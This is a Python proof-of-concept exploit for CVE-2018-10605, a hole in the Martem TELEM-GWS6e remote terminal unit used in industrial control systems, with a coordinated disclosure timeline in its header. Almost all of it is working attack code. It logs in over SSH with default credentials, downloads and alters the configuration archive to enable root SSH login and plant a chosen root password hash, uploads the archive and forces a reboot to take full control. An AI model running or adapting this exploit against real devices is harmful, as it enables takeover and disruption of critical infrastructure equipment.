#!/usr/bin/python
# coding=utf-8
"""
CVE-2018-10605

Martem TELEM-GWS6e configuration update process abuse allowing
configuration modification, command execution and privilege
escalation.
2018 Lockout

ATTACK PROOF-OF-CONCEPT CODE
UNSANCTIONED USE FORBIDDEN!

Licensed under MIT license (MIT)
Please see http://opensource.org/licekses/MIT for more details

DISCLOSURE:
12FEB2018 - Attack vector found
28FEB2018 - ICS-CERT notified
01MAR2018 - Vendor notified
07MAR2018 - Vulnerability coordination with ICS-CERT and Martem
31JUL2018 - Patch released

Script Depends on:
 - paramiko - pip install paramiko
 - paramiko scp - pip install scp
"""
__version__ = "0.0.2"
__author__ = "Lockout"
__year__ = "2018"

import paramiko
import scp
import tarfile
import os
from sys import exit
from shutil import rmtree


# ATTACK VECTOR 1:
# Default password used for most of the deployments, according to the vendor
# and ICS opeator discussions, due to various reasons.
# Target values not disclosed here due to security reasons.
SSHusername = ""        # Username with limited permissions
SSHpassword = ""        # Default password
SSHhost = ""            # Target RTU IP address
SSHport = 22            # SSH port
ConfigFilePath = ""     # Path to the configuration file
ConfigFileName = ""     # Configuration file name
ConfigFileNameNew = ""  # Configuration new file name
ResetFile = ""          # Full path to the RTU reset file


# Connect to the RTU with default credentials
SSHclient = paramiko.SSHClient()
try:
    SSHclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    SSHclient.connect(
        hostname=SSHhost,
        port=SSHport,
        username=SSHusername,
        password=SSHpassword
        )
except Exception as e:
    print(e)
    exit(1)
print("[+] Connected to RTU {0}".format(SSHhost))

# ATTACK VECTOR 2:
# Weak permissions on file system, allowing read and copy of the existing
# system configuration file.
#
# Retrieve current configuration from RTU
with scp.SCPClient(SSHclient.get_transport()) as SCPclient:
    SCPclient.get(ConfigFilePath + ConfigFileName)
print("[+] Current RTU configuration downloaded")

# Unpack setup file
print("[*] Modifying the locally downloaded configuration file...")
tar = tarfile.open(ConfigFileName, 'r:xz')
tar.extractall(path="setup")
tar.close()

# ATTACK VECTOR 3:
# Add to the new configuration archive all the necessary files with
# modifications. These modifications will be written to the system, overwriting
# existing system files with the new ones. Thus it allows overwriting
# protected system, root only accesible files, by a limited user. This allows
# full compromise of the device and modification of the running state.
#
# Change and create new configuration
# Allow SSH Root Login
with open('setup/etc/sshd_config', 'w') as sshd:
    config = "PermitRootLogin yes\n"
    sshd.write(config)
    sshd.close()
print("\t[+] Added configuration to allow root SSH login")

# Create a new shadow file with new root hash.
# The new_config docstring has been shortened not to include other information
# from shadow file. Please provide full original shadow file here with
# root hash changed.
with open('setup/etc/shadow', 'w') as shadow:
    new_config = """
root:$6$WjZQbFxT7nHorP0S$7.hYnXqdf6nX4FNXDBmGcNKM1I2j1EP2xfCe2WEHkTaaOleNR/dTaaE3lQJzZjo9VBeuHD3mr4bEg5qO4SYy4.:10933:0:99999:7:::
"""
    config = new_config
    shadow.write(config)
    shadow.close()
print("\t[+] Root hash changed for setup/etc/shadow")

# Change more in the filesystem if needed
# Add commands here...

# Recreate the configuration archive with the new files
print("[*] Packing the new configuration...")
os.chdir('setup')
tar = tarfile.open(ConfigFileNameNew, 'w:xz')
tar.add('.')
tar.close()

# ATTACK VECTOR 4:
# Weak permissions on the RTU system, and no proper configuration update
# integrity and confidantiality checks allow upload of arbitrary and malicious
# configuration.
#
# Copy the new setup file to the RTU
with scp.SCPClient(SSHclient.get_transport()) as SCPclient:
    SCPclient.put(ConfigFileNameNew, ConfigFilePath + ConfigFileNameNew)
print("[+] New configuration uploaded to RTU")

# Cleanup - delete the temporary setup folder and files
os.chdir('..')
rmtree('setup')
os.remove(ConfigFileName)

# ATTACK VECTOR 5:
# Abuse of the RTU watchdog service allows an arbitrary reboot of the system.
# This can also be used as a DoS attack by constantly creating
# the reset file in the predefined path either remotely or tampering the system
# start-up scripts.
#
# Reboot the RTU to commit the new setup
stdin, stdout, stderr = SSHclient.exec_command(
    'touch ' + ResetFile
    )
print("[+] Writing remote command to reboot RTU and commit new configuration")

SCPclient.close()
SSHclient.close()

print("[+] Configuration done! Wait until RTU reboots!")
print("\tssh root@{0}".format(SSHhost))
SSHpassword = ""                # New root assword written to the shadow file
print("\tUse password: {0}".format(SSHpassword))
